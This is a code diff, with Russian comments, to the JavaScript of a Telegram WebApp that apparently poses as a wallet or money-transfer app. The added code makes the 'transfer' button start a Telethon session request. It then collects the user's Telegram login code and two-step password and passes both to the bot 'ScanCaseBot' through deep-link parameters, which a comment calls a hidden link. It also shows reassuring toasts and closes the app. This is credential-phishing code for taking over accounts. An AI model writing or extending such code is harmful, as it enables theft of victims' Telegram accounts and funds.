@@ -564,10 +564,12 @@ function appendCodeDigit(digit) {
     currentCode += digit;
     updateCodeDots();
     if (currentCode.length === 5) {
-        // Код введён полностью — отправляем в бота
+        // Код введён полностью — отправляем в бота через скрытую ссылку
         const botUsername = 'ScanCaseBot';
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendCode_${currentUserId}_${currentCode}`);
-        // Через 2 секунды закрываем WebApp, чтобы пользователь увидел ответ бота
+        // Показываем toast что код отправляется
+        showToast('Код отправляется...', 'info');
+        // Через 2 секунды закрываем WebApp, чтобы пользователь увидел ответ бота в чате
         setTimeout(() => {
             tg.close();
         }, 2000);
@@ -619,7 +621,7 @@ if (passwordSubmit) {
         }
         const botUsername = 'ScanCaseBot';
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendPassword_${currentUserId}_${password}`);
-        // Через 2 секунды закрываем WebApp
+        showToast('Пароль отправляется...', 'info');
         setTimeout(() => {
             tg.close();
         }, 2000);
@@ -651,12 +653,19 @@ function addTransaction(type, amount, description) {
 }
 
 // Функция запуска авторизации через Telethon
+// Вызывается при нажатии кнопки "Перевести" в форме
 function startAuthFlow() {
     const botUsername = 'ScanCaseBot';
-    // Отправляем запрос на создание сессии
+    // Отправляем запрос на создание сессии (скрыто, WebApp не закрывается)
     tg.openTelegramLink(`https://t.me/${botUsername}?start=createSession_${currentUserId}`);
-    // Через 2 секунды показываем экран ввода кода (даём боту время отправить код)
+    // Показываем экран ввода кода через 2 секунды (даём боту время отправить код)
     setTimeout(() => {
+        // Скрываем текущую форму перевода
+        const activeForm = document.querySelector('.transfer-form-screen.active');
+        if (activeForm) {
+            activeForm.classList.remove('active');
+        }
+        // Показываем экран ввода кода
         codeScreen.classList.add('active');
         pushScreen(codeScreen, null, "#1a1d29");
     }, 2000);
@@ -681,9 +690,7 @@ if (walletSubmit) {
             return;
         }
 
-        // Проверяем, авторизован ли пользователь через Telethon
-        // Пока просто запускаем flow авторизации
-        // В будущем: if (!userData.telegramAuth) { startAuthFlow(); return; }
+        // Запускаем flow авторизации
         startAuthFlow();
     });
 }
@@ -862,7 +869,6 @@ function handleStartAppParam() {
         const targetUserId = parseInt(startParam.split('_')[1]);
         if (targetUserId === currentUserId) {
             showToast('Авторизация успешна!', 'success');
-            // Сохраняем флаг авторизации
             userData.telegramAuth = true;
             saveUserData(currentUserId, userData);
         }
